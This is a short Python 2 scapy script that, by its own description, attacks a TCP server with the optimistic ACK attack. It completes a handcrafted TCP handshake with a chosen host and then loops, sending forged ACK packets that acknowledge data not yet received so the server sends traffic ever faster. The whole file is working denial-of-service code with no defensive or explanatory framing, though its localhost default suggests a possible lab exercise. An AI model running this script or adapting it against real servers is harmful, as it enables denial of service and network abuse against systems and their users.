#!/usr/bin/env python  
import argparse  
import time  
from scapy.all import *  
  
parser = argparse.ArgumentParser(description='Attack a TCP server with the optimistic ack attack.')  
parser.add_argument('--host', default='127.0.0.1', type=str, help='The ip address to attack.')  
args = parser.parse_args()  
  
if __name__ == "__main__":  
    host=args.host  
    sequence_no=4444  
    source_port=6666  
    dest_port=12345  
    firsthandshake=IP(dst=host) / TCP(sport=source_port, dport=dest_port, flags='S', seq=sequence_no)  
    print "First handshake"  
    firsthandshake.show()  
    secondhandshake = sr1(firsthandshake)  
    print "Second handshake"   
    secondhandshake.show()    
    thirdhandshake = IP(dst=host) / TCP(sport=source_port, dport=dest_port, flags='A', ack=(secondhandshake.seq + 1), seq=(sequence_no + 1))  
    print "Third handshake"  
    thirdhandshake.show()  
    lastdata=sr1(thirdhandshake)  
    print "last data"  
    lastdata.show()  
	  
	  

    start_ack = lastdata.seq  
    print(start_ack)  
    window = len(lastdata.payload.payload)  
    print(window)  
	      
	  
    for i in range(1, int(10000000 / window)):  
            opt_ack_attack =  IP(dst=host) / TCP(sport=source_port, dport=dest_port, flags='A', ack=(start_ack + i * window), seq=(sequence_no + 1))  
            if i==1:  
            	     print "first data"  
            	     opt_ack_attack.show()  
            send(opt_ack_attack) 
